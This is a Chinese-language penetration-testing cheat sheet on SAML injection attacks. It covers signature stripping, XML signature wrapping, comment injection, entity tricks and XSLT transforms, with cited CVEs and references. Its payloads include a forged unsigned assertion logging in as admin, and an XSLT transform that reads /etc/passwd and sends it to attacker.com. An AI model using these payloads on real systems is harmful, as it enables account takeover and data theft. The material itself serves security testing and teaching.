# SAML 注入

> SAML（Security Assertion Markup Language）是一种开放标准，用于在各方之间交换身份验证和授权数据，特别是身份提供商和服务提供商之间的交换。尽管 SAML 广泛用于实现单点登录（SSO）和其他联合身份验证场景，但不当的实现或配置可能会使系统暴露于各种漏洞。

## 概述

* [工具](#工具)
* [方法论](#方法论)
    * [无效签名](#无效签名)
    * [签名剥离](#签名剥离)
    * [XML 签名包装攻击](#xml签名包装攻击)
    * [XML 注释处理](#xml注释处理)
    * [XML 外部实体](#xml外部实体)
    * [可扩展样式表语言转换](#可扩展样式表语言转换)
* [参考文献](#参考文献)

## 工具

* [CompassSecurity/SAMLRaider](https://github.com/SAMLRaider/SAMLRaider) - SAML2 Burp 插件。
* [ZAP 插件/SAML 支持](https://www.zaproxy.org/docs/desktop/addons/saml-support/) - 允许检测、显示、编辑和模糊化 SAML 请求。

## 方法论

一个 SAML 响应应该包含 `<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"`。

### 无效签名

未由真实证书颁发机构签名的签名容易被克隆。确保签名是由真实证书颁发机构签署的。如果证书是自签名的，您可能能够克隆该证书或创建自己的自签名证书来替换它。

### 签名剥离

> [...] 接受未签名的 SAML 声明等同于接受用户名而未检查密码 - @ilektrojohn

目标是伪造一个未经签名的完整 SAML 声明。对于某些默认配置，如果从 SAML 响应中省略签名部分，则不会执行签名验证。

示例：不带签名的 SAML 声明，其中 `NameID=admin`。

```xml
<?xml version="1.0" encoding="UTF-8"?>
<saml2p:Response xmlns:saml2p="urn:oasis:names:tc:SAML:2.0:protocol" Destination="http://localhost:7001/saml2/sp/acs/post" ID="id39453084082248801717742013" IssueInstant="2018-04-22T10:28:53.593Z" Version="2.0">
    <saml2:Issuer xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion" Format="urn:oasis:names:tc:SAML:2.0:nameidformat:entity">REDACTED</saml2:Issuer>
    <saml2p:Status xmlns:saml2p="urn:oasis:names:tc:SAML:2.0:protocol">
        <saml2p:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success" />
    </saml2p:Status>
    <saml2:Assertion xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion" ID="id3945308408248426654986295" IssueInstant="2018-04-22T10:28:53.593Z" Version="2.0">
        <saml2:Issuer Format="urn:oasis:names:tc:SAML:2.0:nameid-format:entity" xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion">REDACTED</saml2:Issuer>
        <saml2:Subject xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion">
            <saml2:NameID Format="urn:oasis:names:tc:SAML:1.1:nameidformat:unspecified">admin</saml2:NameID>
            <saml2:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
                <saml2:SubjectConfirmationData NotOnOrAfter="2018-04-22T10:33:53.593Z" Recipient="http://localhost:7001/saml2/sp/acs/post" />
            </saml2:SubjectConfirmation>
        </saml2:Subject>
        <saml2:Conditions NotBefore="2018-04-22T10:23:53.593Z" NotOnOrAfter="2018-0422T10:33:53.593Z" xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion">
            <saml2:AudienceRestriction>
                <saml2:Audience>WLS_SP</saml2:Audience>
            </saml2:AudienceRestriction>
        </saml2:Conditions>
        <saml2:AuthnStatement AuthnInstant="2018-04-22T10:28:49.876Z" SessionIndex="id1524392933593.694282512" xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion">
            <saml2:AuthnContext>
                <saml2:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</saml2:AuthnContextClassRef>
            </saml2:AuthnContext>
        </saml2:AuthnStatement>
    </saml2:Assertion>
</saml2p:Response>
```

### XML 签名包装攻击

XML 签名包装（XSW）攻击，一些实现会检查有效的签名并匹配有效的声明，但不会检查多个声明、多个签名，或者根据声明的顺序表现出不同的行为。

* **XSW1**：适用于 SAML 响应消息。在现有签名之后添加响应的克隆无签名副本。
* **XSW2**：适用于 SAML 响应消息。在现有签名之前添加响应的克隆无签名副本。
* **XSW3**：适用于 SAML 声明消息。在现有声明之前添加声明的克隆无签名副本。
* **XSW4**：适用于 SAML 声明消息。在现有声明内部添加声明的克隆无签名副本。
* **XSW5**：适用于 SAML 声明消息。更改声明副本中的值，并在 SAML 消息末尾添加移除了签名的原始声明副本。
* **XSW6**：适用于 SAML 声明消息。更改声明副本中的值，并在原始签名之后添加移除了签名的原始声明副本。
* **XSW7**：适用于 SAML 声明消息。添加一个带有克隆无签名声明的“扩展”块。
* **XSW8**：适用于 SAML 声明消息。添加一个包含移除了签名的原始声明的“对象”块。

在以下示例中，使用了这些术语。

* **FA**：伪造声明
* **LA**：合法声明
* **LAS**：合法声明的签名

```xml
<SAMLResponse>
  <FA ID="evil">
      <Subject>Attacker</Subject>
  </FA>
  <LA ID="legitimate">
      <Subject>Legitimate User</Subject>
      <LAS>
         <Reference Reference URI="legitimate">
         </Reference>
      </LAS>
  </LA>
</SAMLResponse>
```

在 GitHub Enterprise 漏洞中，此请求会验证并为 `Attacker` 创建会话，而不是 `Legitimate User`，即使 `FA` 未签名。

### XML 注释处理

威胁行为者已经对 SSO 系统进行了身份验证，可以无需该用户的 SSO 密码就以另一个用户的身份进行身份验证。此 [漏洞](https://www.bleepstatic.com/images/news/u/986406/attacks/Vulnerabilities/SAML-flaw.png) 在以下库和产品中有多个 CVE。

* OneLogin - python-saml - CVE-2017-11427
* OneLogin - ruby-saml - CVE-2017-11428
* Clever - saml2-js - CVE-2017-11429
* OmniAuth-SAML - CVE-2017-11430
* Shibboleth - CVE-2018-0489
* Duo Network Gateway - CVE-2018-7340

研究人员注意到，如果攻击者在用户名字段中插入注释，从而破坏用户名，攻击者可能会获得对合法用户帐户的访问权限。

```xml
<SAMLResponse>
    <Issuer>https://idp.com/</Issuer>
    <Assertion ID="_id1234">
        <Subject>
            <NameID>user@user.com<!--XMLCOMMENT-->.evil.com</NameID>
```

其中 `user@user.com` 是用户名的第一部分，`.evil.com` 是第二部分。

### XML 外部实体

另一种利用方式是使用 `XML 实体` 来绕过签名验证，因为内容在 XML 解析时不会改变。

在以下示例中：

* `&s;` 将解析为字符串 `"s"`
* `&f1;` 将解析为字符串 `"f1"`

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE Response [
  <!ENTITY s "s">
  <!ENTITY f1 "f1">
]>
<saml2p:Response xmlns:saml2p="urn:oasis:names:tc:SAML:2.0:protocol"
  Destination="https://idptestbed/Shibboleth.sso/SAML2/POST"
  ID="_04cfe67e596b7449d05755049ba9ec28"
  InResponseTo="_dbbb85ce7ff81905a3a7b4484afb3a4b"
  IssueInstant="2017-12-08T15:15:56.062Z" Version="2.0">
[...]
  <saml2:Attribute FriendlyName="uid"
    Name="urn:oid:0.9.2342.19200300.100.1.1"
    NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:uri">
    <saml2:AttributeValue>
      &s;taf&f1;
    </saml2:AttributeValue>
  </saml2:Attribute>
[...]
</saml2p:Response>
```

服务提供商接受了 SAML 响应。由于漏洞，服务提供商应用程序报告“taf”作为“uid”属性的值。

### 可扩展样式表语言转换

可以通过使用 `transform` 元素执行 XSLT。

![http://sso-attacks.org/images/4/49/XSLT1.jpg](http://sso-attacks.org/images/4/49/XSLT1.jpg)
图片来自 [http://sso-attacks.org/XSLT_Attack](http://sso-attacks.org/XSLT_Attack)

```xml
<ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
  ...
    <ds:Transforms>
      <ds:Transform>
        <xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
          <xsl:template match="doc">
            <xsl:variable name="file" select="unparsed-text('/etc/passwd')"/>
            <xsl:variable name="escaped" select="encode-for-uri($file)"/>
            <xsl:variable name="attackerUrl" select="'http://attacker.com/'"/>
            <xsl:variable name="exploitUrl"select="concat($attackerUrl,$escaped)"/>
            <xsl:value-of select="unparsed-text($exploitUrl)"/>
          </xsl:template>
        </xsl:stylesheet>
      </ds:Transform>
    </ds:Transforms>
  ...
</ds:Signature>
```

## 参考文献

* [攻击 SSO：常见的 SAML 漏洞及其发现方法 - Jem Jensen - 2017年3月7日](https://blog.netspi.com/attacking-sso-common-saml-vulnerabilities-ways-find/)
* [如何查找 SAML 中的漏洞：一种方法论 - 第一部分 - Ben Risher (@epi052) - 2019年3月7日](https://epi052.gitlab.io/notes-to-self/blog/2019-03-07-how-to-test-saml-a-methodology/)
* [如何查找 SAML 中的漏洞：一种方法论 - 第二部分 - Ben Risher (@epi052) - 2019年3月13日](https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/)
* [如何查找 SAML 中的漏洞：一种方法论 - 第三部分 - Ben Risher (@epi052) - 2019年3月16日](https://epi052.gitlab.io/notes-to-self/blog/2019-03-16-how-to-test-saml-a-methodology-part-three/)
* [破解 SAML：成为你想成为的人 - Juraj Somorovsky, Andreas Mayer, Jorg Schwenk, Marco Kampmann 和 Meiko Jensen - 2012年8月23日](https://www.usenix.org/system/files/conference/usenixsecurity12/sec12-final91-8-23-12.pdf)
* [Oracle Weblogic - 多个 SAML 漏洞 (CVE-2018-2998/CVE-2018-2933) - Denis Andzakovic - 2018年7月18日](https://pulsesecurity.co.nz/advisories/WebLogic-SAML-Vulnerabilities)
* [SAML Burp 插件 - Roland Bischofberger - 2015年7月24日](https://blog.compass-security.com/2015/07/saml-burp-extension/)
* [SAML 安全备忘单 - OWASP - 2019年2月2日](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/SAML_Security_Cheat_Sheet.md)
* [伪造断言的道路通向你的代码库 - Ioannis Kakavas (@ilektrojohn) - 2017年3月13日](http://www.economyofmechanism.com/github-saml)
* [Shibboleth 2 中 SAML 属性截断 - redteam-pentesting.de - 2018年1月15日](https://www.redteam-pentesting.de/de/advisories/rt-sa-2017-013/-truncation-of-saml-attributes-in-shibboleth-2)
* [漏洞说明 VU#475445 - Garret Wassermann - 2018年2月27日](https://www.kb.cert.org/vuls/id/475445/)